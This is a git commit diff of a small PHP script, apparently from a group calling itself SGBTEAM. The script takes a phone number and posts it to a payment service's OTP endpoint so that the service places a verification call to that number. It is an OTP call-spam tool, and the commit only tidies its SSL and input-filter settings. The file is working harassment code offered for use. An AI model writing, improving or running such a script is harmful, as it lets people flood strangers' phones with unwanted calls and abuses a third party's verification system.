8790d505f943a1fbc5aa8b504073eefbfa0bee2d
rmaista <r93706221@gmail.com>
2026-03-12 23:39:01 +0300

    Update call.php

--- call.php
+++ call.php
@@ -1,9 +1,8 @@
 <?php
-// Limit 3x Telpon Setiap Satu Nomor
 function send($phone) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HEADER, true);
@@ -11,22 +10,18 @@ function send($phone) {
     curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
 
     $asw = curl_exec($ch);
-
     if ($asw === false) {
-        echo "cURL Error: " . curl_error($ch) . "\n";
+        echo "Curl Error: " . curl_error($ch) . "\n";
     } else {
-        echo $asw . "\n";
+        echo "Response: " . $asw . "\n";
     }
-
     curl_close($ch);
 }
 
 echo "COPYRIGHT ; SGBTEAM\n\n";
-echo "Nomor\nInput : ";
-
+echo "Nomor Input : ";
 $nomor = trim(fgets(STDIN));
-$nomor = filter_var($nomor, FILTER_SANITIZE_STRING);
+$nomor = filter_var($nomor, FILTER_SANITIZE_NUMBER_INT);
 
 $execute = send($nomor);
-print $execute;
 ?>
